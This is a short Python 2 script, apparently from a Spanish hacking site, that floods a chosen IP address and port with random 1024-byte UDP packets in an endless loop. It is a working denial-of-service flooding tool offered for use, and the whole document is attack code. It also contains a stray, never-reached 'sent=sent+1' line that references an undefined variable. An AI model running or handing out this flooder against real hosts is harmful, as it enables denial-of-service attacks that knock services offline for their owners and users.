import socket
import random
print "##################################"
print "# Envio paquetes UDP inundacion  #"
print "# (c) hackingyseguridad.com 2017 #"
print "# Ctrol+C para interrumpir envio #"
print "##################################"
sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
bytes=random._urandom(1024)
ip=raw_input('IP_Destino_Target: ')
port=input('Puerto: ')
while 1:
    sock.sendto(bytes,(ip,port))
sent=sent+1
